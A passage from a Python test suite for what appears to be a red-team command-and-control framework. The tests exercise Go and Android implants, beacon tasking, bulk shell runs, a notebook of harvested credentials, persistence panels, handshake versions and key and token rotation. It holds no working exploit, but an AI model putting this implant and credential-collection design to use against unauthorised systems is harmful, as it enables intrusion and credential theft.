                "workflow.run", "workflow.status"):
        assert f'"{rpc}"' in rbac, rpc

    store = read_text("server/internal/store/workflow.go")
    assert "func (s *Store) AddWorkflow(" in store, store
    assert "func ExpandWorkflow(" in store, store
    hub = read_text("server/internal/hub/workflow.go")
    assert "func (h *Hub) RunWorkflow(" in hub, hub

    mock = read_text("tools/mock_server.py")
    for rpc in ("workflow.list", "workflow.add", "workflow.remove",
                "workflow.run", "workflow.status"):
        assert rpc in mock, rpc

    client = read_text("operator/umbra_cli/client.py")
    for method in ("workflow_list", "workflow_add", "workflow_remove",
                   "workflow_run", "workflow_status"):
        assert f"def {method}(" in client, method

    console = read_text("operator/umbra_cli/cli.py")
    assert '"workflow"' in console, console
    assert '"batch"' in console, console
    assert '"rpc"' in console, console
    flows = read_text("operator/umbra_cli/flows.py")
    assert "def run_bulk(" in flows, flows
    assert "def run_plan(" in flows, flows
    plan = read_text("operator/umbra_cli/plan.py")
    assert "def parse_plan(" in plan, plan


def test_the_notebook_holds_the_material_of_the_engagement():
    """The notebook keeps the findings, the artefacts and the material."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import db

    import tempfile

    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "notebook.db")
        store = db.StateStore(path).open()
        try:
            store.start_session("alice", "127.0.0.1:9000", "abc123")
            store.record_task("t1", "agent-1", "recon", {"profile": "windows"})
            store.record_result("t1", 0, b"the answer", "")

            store.add_finding("agent-1", "user", "the admin account",
                              "the account is an administrator", "high", "windows")
            store.add_artifact("notes.txt", "agent-1", "abc123", "C:/notes.txt", 42)
            store.add_screenshot("agent-1", "C:/shot.png", "def456", 1024)
            store.add_credential("agent-1", "password", "admin", "10.0.0.5",
                                 "Pa55w0rd", "lsass", 90)

            # The search reaches everything the notebook holds.
            hits = store.search("admin")
            where = {hit["where"] for hit in hits}
            assert "finding" in where, hits
            assert "credential" in where, hits
            hits = store.search("notes.txt")
            assert any(hit["where"] == "artifact" for hit in hits), hits
            hits = store.search("shot.png")
            assert any(hit["where"] == "screenshot" for hit in hits), hits

            # The counters know the material.
            stats = store.stats()
            assert stats["findings"] == 1, stats
            assert stats["artifacts"] == 1, stats
            assert stats["screenshots"] == 1, stats
            assert stats["credentials"] == 1, stats

            # The export is JSON, and the Markdown document is the one an
            # operator hands over.
            import json as _json

            target = store.export(os.path.join(tmp, "notebook.json"))
            with open(target, encoding="utf-8") as handle:
                payload = _json.load(handle)
            assert len(payload["findings"]) == 1, payload
            assert len(payload["credentials"]) == 1, payload

            target = store.export(os.path.join(tmp, "notebook.md"))
            with open(target, encoding="utf-8") as handle:
                text = handle.read()
            assert "The notebook" in text, text[:200]
            assert "The findings" in text, text[:200]
            assert "the admin account" in text, text[:400]
            assert "Pa55w0rd" in text, text[:400]
        finally:
            store.close()

        # The notebook of a console that never ran is still a notebook.
        with db.StateStore(os.path.join(tmp, "fresh.db")).open() as fresh:
            assert fresh.stats()["tasks"] == 0


def test_the_shell_of_the_console_remembers_and_completes():
    """The prompt completes, the history is kept and a command may span lines."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import shell

    class FakeConsole:
        class client:  # noqa: N801 - the console only needs the client
            @staticmethod
            def agents():
                return [{"id": "agent-one"}, {"id": "agent-two"}]

        current_agent = "agent-one"

    console = FakeConsole()

    # The commands are completed by their name.
    assert "workflow" in shell.complete(console, "work"), shell.complete(console, "work")
    assert shell.complete(console, "zzzz") == []

    # The agents are completed by their id.
    assert shell.complete(console, "use agent-") == ["agent-one", "agent-two"]

    # A line that is still open is continued.
    assert shell._unbalanced('{"cmd": "whoami"') is True
    assert shell._unbalanced('{"cmd": "whoami"}') is False
    assert shell._unbalanced("run agent-one 'ls -l") is True

    # The status line says what the console is looking at.
    console._status = {"agents_online": 2, "agents_total": 3,
                       "tasks_pending": 4, "sleep": 30}
    line = shell.status_line(console)
    assert "agent-one" in line, line
    assert "2/3 online" in line, line
    assert "queue 4" in line, line


def test_the_bulk_run_answers_for_every_agent():
    """One task, many agents, one cap on the answers waited for."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-bulk-0123456789a"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agents = [FakeAgent(server.address, AGENT_PSK, f"agent-bulk-{i}") for i in range(3)]
    for agent in agents:
        agent.start()

    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli.client import OperatorClient
    from umbra_cli.flows import render_bulk_table, run_bulk

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and len(client.agents()) < 3:
            time.sleep(0.05)

        rows = client.submit_bulk("shell", {"cmd": "id"},
                                  agents=[f"agent-bulk-{i}" for i in range(3)])
        assert len(rows) == 3, rows

        results = run_bulk(client, None, "shell", {"cmd": "id"}, rows, cap=2, timeout=20)
        assert len(results) == 3, results
        for row in results:
            assert row.get("state") == "done", row
            assert row.get("code") == 0, row

        table = render_bulk_table(results)
        assert "agent-bulk-0" in table, table
        assert "done" in table, table
    finally:
        client.close()
        for agent in agents:
            agent.stop()
        server.stop()


def test_the_raw_command_line_reaches_the_server():
    """`umbra rpc` is the escape hatch: every command, from the shell."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-rpc-0123456789abcd"
    op_token = b"operator-token-rpc-operator-0123"
    # A viewer may look, but not burn the engagement.
    server = MockServer(AGENT_PSK, {"alice": token, "bob": op_token},
                        roles={"alice": "viewer", "bob": "operator"})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-rpc")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    other = OperatorClient(server.address, op_token.decode(), "bob")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The raw form of a command.
        answer = client.rpc("agents.list")
        assert answer.ok, answer
        assert answer.data["agents"], answer.data

        # The raw form of a command that is not allowed for this role.
        answer = client.rpc("agents.panic", {"id": "agent-rpc"})
        assert not answer.ok, answer
        assert "permission denied" in answer.error, answer

        # The raw form of a command that queues work, from a console whose
        # role may do it.
        other.connect()
        answer = other.rpc("task.submit", {"id": "agent-rpc", "kind": "shell",
                                           "args": {"cmd": "id"}})
        assert answer.ok, answer
        assert answer.data["task_id"], answer.data
    finally:
        client.close()
        other.close()
        agent.stop()
        server.stop()


def test_the_engagement_report_tells_the_whole_story():
    """The report carries the inventory, the findings and the timeline."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-report-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-report")
    agent.start()

    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli.client import OperatorClient
    from umbra_cli.cli import build_engagement_report

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        task_id = client.submit("agent-report", "recon", {"profile": "windows"})
        client.wait_for_result(task_id, timeout=15, poll=0.05)

        text = build_engagement_report(client, 50, None)
        for section in ("# The engagement", "## The hosts", "## The persistence",
                        "## The tasks", "## The findings", "## The material",
                        "## The artefacts", "## The timeline", "## The team"):
            assert section in text, (section, text[:400])
        assert "agent-report" in text, text[:600]
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_dashboard_has_the_panels_the_team_needs():
    """The dashboard shows the persistence, the vault, the team and the output."""
    dash = read_text("server/internal/dash/dash.go")
    for route in ("/api/persistence", "/api/credentials", "/api/workflows",
                  "/api/workflow", "/api/alerts", "/api/operators", "/api/output"):
        assert route in dash, route

    page = read_text("server/internal/dash/index.html")
    for panel in ("persistence", "credentials", "operators", "workflows",
                  "alerts", "output"):
        assert f'id="{panel}"' in page, panel
    assert 'id="rpcForm"' in page, page

    # Every operator command is reachable from the dashboard as well, with
    # the role of the dashboard attached.
    assert "/api/rpc" in dash, dash
    link = read_text("server/internal/link/operator.go")
    assert "func (s *Server) DispatchOperator(" in link, link


def test_the_queue_is_predictable_and_the_dead_letter_waits():
    """The priority decides the order, and a task that keeps failing is parked."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-queue-0123456789a"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-queue")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # Three tasks, and the urgent one is marked as urgent.
        first = client.submit("agent-queue", "shell", {"cmd": "one"})
        second = client.submit("agent-queue", "shell", {"cmd": "two"})
        third = client.submit("agent-queue", "shell", {"cmd": "three"})
        client.set_priority(third, 10)

        # The queue says what it is going to do.
        queue = client.queue()
        assert queue["max_attempts"] == 3, queue
        assert queue["max_in_flight_per_agent"] == 4, queue
        assert queue["dead_letter"] == [], queue

        # The task carries the priority and the trace.
        task = client.task(third)
        assert task["priority"] == 10, task
        assert task["trace_id"], task
        # Every task has its own trace.
        assert client.task(first)["trace_id"] != task["trace_id"], task

        # The urgent task goes first: the beacon receives the batch in
        # the order the queue decided.
        deadline = time.time() + 20
        while time.time() < deadline:
            with server._lock:
                batches = list(server.delivery_log)
            if batches:
                break
            time.sleep(0.2)
        assert batches, "the queue handed nothing out"
        assert batches[0][0] == third, batches
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_host_that_keeps_failing_ends_up_in_the_dead_letter():
    """The breaker of a host opens, and the work that fails on it is parked."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-dead-0123456789abc"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-dead")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The task fails: the fake agent answers with an error.
        task_id = client.submit("agent-dead", "shell", {"cmd": "exit 3"})
        deadline = time.time() + 20
        while time.time() < deadline:
            if client.task(task_id)["state"] in ("done", "failed", "dead"):
                break
            time.sleep(0.2)
        task = client.task(task_id)
        assert task["state"] == "failed", task
        # The trace travelled with the task.
        assert task["trace_id"], task
        # The breaker counted the failure.
        with server._lock:
            assert server.breakers.get("agent-dead", 0) >= 1, server.breakers
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_quiet_window_stops_the_traffic():
    """The maintenance window: the beacons check in and get nothing."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-quiet-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-quiet")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The window is closed.
        answer = client.quiet(True)
        assert answer["quiet"] is True, answer

        # Nothing new is queued while the window is closed.
        with pytest.raises(Exception):
            client.submit("agent-quiet", "shell", {"cmd": "id"})

        # The window is open again.
        answer = client.quiet(False)
        assert answer["quiet"] is False, answer
        task_id = client.submit("agent-quiet", "shell", {"cmd": "id"})
        assert task_id
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_reliability_is_in_every_implementation():
    """The queue, the breakers, the quiet window, the metrics and the trace."""
    hub = read_text("server/internal/hub/queue.go")
    for symbol in ("func (h *Hub) allowDelivery(", "func (h *Hub) BreakerOpen(",
                   "func (h *Hub) SetQuiet(", "func (h *Hub) DeadLetter(",
                   "func NewTraceID(", "func (h *Hub) NoteBytes("):
        assert symbol in hub, symbol
    metrics = read_text("server/internal/hub/metrics.go")
    assert "func (h *Hub) Metrics()" in metrics, metrics

    store = read_text("server/internal/store/store.go")
    for symbol in ("func (s *Store) Candidates(", "func (s *Store) MarkDelivered(",
                   "func (s *Store) DeadLetter(", "func (s *Store) SetPriority(",
                   "func (s *Store) InFlight(", "func rotateBackups("):
        assert symbol in store, symbol

    config = read_text("server/internal/config/config.go")
    assert "type Queue struct" in config, config

    link = read_text("server/internal/link/operator.go")
    for rpc in ("server.quiet", "server.queue", "task.priority"):
        assert rpc in link, rpc
    rbac = read_text("server/internal/rbac/rbac.go")
    for rpc in ("server.quiet", "server.queue", "task.priority"):
        assert f'"{rpc}"' in rbac, rpc

    dash = read_text("server/internal/dash/dash.go")
    assert "/metrics" in dash, dash
    assert "umbra_task_latency_seconds" in dash, dash

    mock = read_text("tools/mock_server.py")
    for rpc in ("server.quiet", "server.queue", "task.priority"):
        assert rpc in mock, rpc

    client = read_text("operator/umbra_cli/client.py")
    for method in ("def quiet(", "def queue(", "def set_priority("):
        assert method in client, method

    # The deployment grew into a real one.
    assert os.path.exists(os.path.join(ROOT, "deploy", "Dockerfile"))
    assert os.path.exists(os.path.join(ROOT, "deploy", "compose.yml"))
    assert os.path.exists(os.path.join(ROOT, "docs", "RUNBOOK.md"))
    prod = json.loads(read_text("deploy/server.prod.json"))
    assert "queue" in prod, prod
    assert prod["queue"]["max_attempts"] == 3, prod


def test_the_second_handshake_carries_the_fields_of_the_new_version():
    """The version 2 handshake: the caps, the version, the ABI and the platform."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-hello2-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-hello2")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        agents = client.agents()
        assert agents, "the agent never registered"
        record = agents[0]
        # The capability list is a field of its own now, and the server
        # kept it: the operator still sees what the host can do.
        assert "shell" in record.get("caps", []), record
        # The handshake version is recorded, so the operator can see what
        # the host speaks.
        assert record.get("hello_version") == 2, record
        assert record.get("abi") == 1, record
        # The implant version travels too.
        assert record.get("implant_version"), record
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_old_handshake_still_works():
    """A beacon that only knows the first version is still served."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli import handshake, netio, session, upk, wire  # noqa: WPS433

    token = b"operator-token-hello1-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()

    # A hand-made beacon: the first version of the handshake, the
    # capability list inside the metadata, and nothing else.
    host, _, port = server.address.rpartition(":")
    sock = socket.create_connection((host, int(port)), timeout=5)
    stream = netio.Stream(sock, timeout=5)
    try:
        result = handshake.client_handshake(
            stream,
            psk=AGENT_PSK,
            role=crypto.ROLE_AGENT,
            ident="agent-old",
            meta={"os": "linux", "arch": "x86_64",
                  "caps": ["shell", "sysinfo"], "ver": "0.0.9"},
            version=1,
        )
        # The answer is in the version the peer asked for.
        assert result.version == 1, result.version
        # The first version has no limits and no ABI in the answer.
        assert result.limits == {}, result.limits
        assert result.compat == (), result.compat
        sess = result.session
        checkin = {"ts": int(time.time()), "n": 0}
        stream.send_frame(sess.encrypt(wire.MsgType.CHECKIN, upk.encode(checkin)))
    finally:
        stream.close()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        records = {a["id"]: a for a in client.agents()}
        assert "agent-old" in records, records
        old = records["agent-old"]
        # The capability list of the old beacon is known all the same.
        assert "shell" in old.get("caps", []), old
        assert old.get("hello_version") == 1, old
    finally:
        client.close()
        server.stop()


def test_the_heartbeat_says_that_the_host_is_alive():
    """The heartbeat is recorded: the operator sees that the host is there."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-heartbeat-0123456"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-beat")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        # The heartbeat arrives with the cycle of the beacon.
        deadline = time.time() + 10
        while time.time() < deadline:
            record = client.agents()[0]
            if record.get("heartbeat"):
                break
            time.sleep(0.1)
        record = client.agents()[0]
        assert record.get("heartbeat"), record
        assert record.get("implant_version"), record
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_handshake_vectors_pin_the_new_version():
    """The second version of the handshake is pinned byte for byte."""
    case = VECTORS["bootstrap_frame_v2"]
    suite = VECTORS["meta"]["suites"]["aes-256-gcm"]
    key = b(case["key"])
    nonce = wire.make_nonce(b(case["prefix"]), case["counter"])
    plain = b(case["plaintext_hex"])
    frame = wire.build_frame(
        suite=suite,
        flags=case["flags"],
        msg_type=case["msg_type"],
        key=key,
        nonce=nonce,
        plaintext=plain,
        aead_encrypt=lambda k, n, a, p, s=suite: crypto.aead_encrypt(s, k, n, a, p),
    )
    assert frame.hex() == case["frame_hex"]
    # The body is the version 2 body: the fields are there.
    body = upk.decode_exact(plain[1:])
    assert body["v"] == 2, body
    for field in ("caps", "iver", "abi", "plat"):
        assert field in body, body
    # The versions the contract pins are the ones the implementations speak.
    assert VECTORS["handshake"]["versions"] == [2, 1]
    assert VECTORS["handshake"]["abi_version"] == 1


def test_the_protocol_documents_the_new_frame_and_the_versions():
    """The frame and the handshake version are in the contract."""
    text = read_text("docs/PROTOCOL.md")
    assert "| `0x1D` | HEARTBEAT |" in text, "the heartbeat frame is not documented"
    assert "### 5.1 The handshake versions" in text, "the matrix is missing"
    assert "### 7.2p The heartbeat" in text, "the heartbeat is not documented"


def test_the_key_of_the_beacons_can_be_rotated_while_the_server_runs():
    """The agent PSK is replaced without a restart, and the old one still works."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-keys-0123456789a"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        answer = client.rotate_keys("agent")
        # The new key is a *text*: the operator copies it into the
        # configuration of the beacons, so it has to be typeable and it
        # has to be the exact bytes the server accepts.
        fresh = answer["psk"]
        assert isinstance(fresh, str) and len(fresh) >= 16, answer
        assert fresh.encode() != AGENT_PSK, "the key did not change"
        assert answer["overlap"] > 0, answer

        # The new key is the one the server accepts from now on: the
        # operator sees the hex, the protocol uses the bytes behind it.
        assert server.agent_psk == bytes.fromhex(fresh), server.agent_psk

        # A beacon that still has the old key is still served: the
        # overlap is what keeps the fleet from falling apart.
        old = FakeAgent(server.address, AGENT_PSK, "agent-old-key")
        old.start()
        try:
            deadline = time.time() + 5
            while time.time() < deadline and not server.agents:
                time.sleep(0.05)
            assert "agent-old-key" in server.agents, list(server.agents)
        finally:
            old.stop()

        # And a beacon with the new key is served too.
        new = FakeAgent(server.address, fresh.encode(), "agent-new-key")
        new.start()
        try:
            deadline = time.time() + 5
            while time.time() < deadline and "agent-new-key" not in server.agents:
                time.sleep(0.05)
            assert "agent-new-key" in server.agents, list(server.agents)
        finally:
            new.stop()
    finally:
        client.close()
        server.stop()


def test_a_token_can_be_rotated_and_narrowed():
    """The token of an operator is replaced, and the scopes say what it may do."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-scopes-012345678"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": b"operator-token-bob-0123456789"})
    server.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        answer = client.rotate_token("bob", "viewer", ["agents.list", "server.stats"])
        assert answer["token"], answer
        assert answer["scopes"] == ["agents.list", "server.stats"], answer

        # The new token is the one bob connects with.
        bob = OperatorClient(server.address, answer["token"], "bob")
        try:
            bob.connect()
            # The state of the tokens is visible: the scopes, the expiry
            # and the last use, but never the token itself.
            rows = client.tokens()
            by_name = {row["operator"]: row for row in rows}
            assert "bob" in by_name, rows
            assert by_name["bob"]["scopes"] == ["agents.list", "server.stats"], rows
            assert by_name["bob"]["last_used"], rows
            assert "token" not in by_name["bob"], rows
        finally:
            bob.close()
    finally:
        client.close()
        server.stop()


def test_the_scopes_of_a_token_refuse_what_they_do_not_name():
    """A token that may only look may not act."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-scope-check-01234"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": b"operator-token-bob-0123456789"})
    server.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        rotated = client.rotate_token("bob", "admin", ["agents.list"])

        # A console with the narrow token may read the inventory.
        narrow = OperatorClient(server.address, rotated["token"], "bob")
        try:
            narrow.connect()
            answer = narrow.rpc("agents.list")
            assert answer.ok, answer.error
            # But the narrow token may not do what is not in its scopes:
            # the server judges the identity of the console, and bob is
            # scoped.
            answer = narrow.rpc("server.stats")
            assert not answer.ok, "the scope did not narrow the token"
            assert "scope" in answer.error.lower(), answer.error
        finally:
            narrow.close()
    finally:
        client.close()
        server.stop()


def test_the_keys_are_in_every_implementation():
    """The rotation of the credentials is in the Go server, the mock and the docs."""
    go = read_text("server/internal/keyring/keyring.go")
    assert "func (k *Keyring) RotateAgentPSK() ([]byte, error)" in go, go[:200]
    assert "func (k *Keyring) RotateOperator(name string) ([]byte, error)" in go, go[:200]
    mock = read_text("tools/mock_server.py")
    assert "def rotate_agent_psk" in mock, "the mock cannot rotate the agent key"
    assert "def rotate_token" in mock, "the mock cannot rotate an operator token"
    docs = read_text("docs/PROTOCOL.md")
    assert "| `keys.rotate` | admin |" in docs, "the rotation is not documented"
    assert "| `tokens.rotate` | admin |" in docs, "the rotation is not documented"
    assert "| `tokens.list` | viewer |" in docs, "the token state is not documented"
    # The scopes are honoured by the role table of the server and by the
    # mock, and both agree on the three commands.
    rbac = read_text("server/internal/rbac/rbac.go")
    for cmd in ("keys.rotate", "tokens.rotate", "tokens.list"):
        assert f'"{cmd}"' in rbac, f"{cmd} has no role"
    # The secrets are redacted before they reach the log.
    audit = read_text("server/internal/audit/audit.go")
    assert "func RedactArgs(" in audit, "the audit log does not redact"
    assert "[redacted]" in audit, "the audit log does not redact"


def test_the_scopes_never_widen_the_role():
    """A scope list narrows what a token may do; it never grants more."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-narrow-0123456"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": b"operator-token-bob-0123456789"})
    server.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        # Bob is a viewer with the scope of an admin command.  The scope
        # may not make him an admin: the role still has the last word.
        rotated = client.rotate_token("bob", "viewer", ["agents.kill"])
        narrow = OperatorClient(server.address, rotated["token"], "bob")
        try:
            narrow.connect()
            answer = narrow.rpc("agents.kill")
            assert not answer.ok, "the scope widened the role"
            assert "role" in answer.error.lower(), answer.error
        finally:
            narrow.close()
    finally:
        client.close()
        server.stop()


def test_a_rotation_does_not_change_the_role_by_accident():
    """Rotating a token without a role keeps the role the operator had."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-role-012345678"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": b"operator-token-bob-0123456789"},
                        roles={"bob": "admin"})
    server.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        rotated = client.rotate_token("bob")
        assert rotated["role"] == "admin", rotated
        rows = client.tokens()
        by_name = {row["operator"]: row for row in rows}
        assert by_name["bob"]["role"] == "admin", rows
    finally:
        client.close()
        server.stop()


def test_the_last_use_of_a_token_is_stamped():
    """A token that was used says when; a token that was not says nothing."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-lastuse-012345"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": b"operator-token-bob-0123456789"})
    server.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        rows = client.tokens()
        by_name = {row["operator"]: row for row in rows}
        # Alice authenticated, so her token has a last use.
        assert by_name["alice"]["last_used"], rows
        # Bob never authenticated, so his token has none.
        assert not by_name["bob"]["last_used"], rows
        # And the moment it was rotated is remembered too.
        assert by_name["alice"]["rotated"] == 0, rows
    finally:
        client.close()
        server.stop()


def test_the_operator_can_bring_its_own_key():
    """A key the operator brings is used as it is, not replaced by a generated one."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-bring-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        brought = "0123456789abcdef0123456789abcdef"
        answer = client.rotate_keys("agent", brought)
        assert answer["psk"] == brought, answer
        # The key the operator brought is hex, and the protocol uses the
        # bytes behind it: the same bytes the beacons read.
        assert server.agent_psk == bytes.fromhex(brought), server.agent_psk
    finally:
        client.close()
        server.stop()


def test_the_secrets_never_reach_the_audit_trail():
    """The redaction is in the server, and it knows the task kinds."""
    audit = read_text("server/internal/audit/audit.go")
    # The whole argument map of a secret task is redacted.
    assert "secretKinds" in audit
    assert '"creds.add"' in audit
    assert '"file.read"' in audit
    # The names of the secret-bearing arguments are redacted too.
    assert '"password"' in audit
    assert '"token"' in audit
    assert '"psk"' in audit
    # And the redaction is used by the RPC path, not only by a helper.
    operator = read_text("server/internal/link/operator.go")
    assert "audit.RedactArgs(cmd, args)" in operator
    # The caller's map is not modified: the redaction copies.
    assert "func Redact(args map[string]any) map[string]any" in audit


def test_the_artifact_store_refuses_the_wrong_key():
    """A sealed store does not open with the wrong key; it never guesses."""
    artifact = read_text("server/internal/artifact/artifact.go")
    assert "func OpenEncrypted(dir string, key []byte) (*Store, error)" in artifact
    assert "ErrWrongKey" in artifact
    # The key comes from the configuration, not from the code.
    config = read_text("server/internal/config/config.go")
    assert "ArtifactKeyEnv" in config
    assert "UMBRA_ARTIFACT_KEY" in config
    # And the server opens the store with it.
    main = read_text("server/cmd/umbra-server/main.go")
    assert "artifact.OpenEncrypted(" in main
    # The certificate is reloaded at every handshake, so a renewed one is
    # in use without a restart.
    mtls = read_text("server/internal/mtls/mtls.go")
    assert "GetCertificate" in mtls
    assert "rotatingCertificate" in mtls


# ---------------------------------------------------------------------------
# 12. The other implants
# ---------------------------------------------------------------------------
def documented_task_kinds() -> set:
    """The task kinds the protocol document lists."""
    text = read_text("docs/PROTOCOL.md")
    section = text.split("Task kinds understood by the reference implants:", 1)[-1]
    for marker in ("Operator RPC commands", "\n### "):
        section = section.split(marker, 1)[0]
    return set(re.findall(r"^\| `([a-z][a-z0-9.]*)` \|", section, re.M))


def test_the_go_implant_advertises_exactly_what_it_runs():
    """The small beacon says what it can do, and does what it says.

    The server refuses to queue a task the host did not say it can run,
    so the list of the Go implant and the table it runs have to be the
    same list.  A kind that is run but not advertised would be a task
    nobody may queue; a kind that is advertised but not run would be a
    task that fails.
    """
    tasks = read_text("implant/go/internal/beacon/tasks.go")
    block = re.search(r"kinds := \[\]string\{(.*?)\n\t\}", tasks, re.S)
    assert block, "the Go implant has no task table"
    advertised = set(re.findall(r'"([a-z][a-z0-9.]*)"', block.group(1)))
    arms = set(re.findall(r'case "([a-z][a-z0-9.]*)":', tasks))
    assert advertised == arms
    assert len(advertised) >= 16
    # Every kind is one the framework knows: the Go implant speaks the
    # vocabulary of the team server, not a dialect of its own.
    assert advertised <= documented_task_kinds()
    # A kind it does not know is answered with an error and not with a
    # silence: the operator has to see that the task did not run.
    assert "errUnknownKind" in tasks
    assert "default:" in tasks


def test_the_go_implant_is_a_module_of_its_own():
    """The Go implant is the standard library and nothing else."""
    mod = read_text("implant/go/go.mod")
    assert "require" not in mod, "the Go implant must not need a crate"
    assert not os.path.exists(os.path.join(ROOT, "implant", "go", "go.sum"))
    # It carries its own copy of the protocol primitives, because a
    # module outside the server tree cannot import its internal packages.
    for part in ("wire", "upk", "crypt", "session"):
        assert os.path.isdir(os.path.join(ROOT, "implant", "go", "internal", part))


def test_the_android_implant_advertises_only_what_it_runs():
    """The phone says what it can do, and refuses the rest out loud."""
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
    block = re.search(r"val CAPABILITIES: List<String> = listOf\((.*?)\n    \)", runner, re.S)
    assert block, "the Android implant has no capability list"
    caps = set(re.findall(r'"([a-z][a-z0-9.]*)"', block.group(1)))
    assert len(caps) >= 30
    # The arms of the runner: every kind it answers, with its aliases.
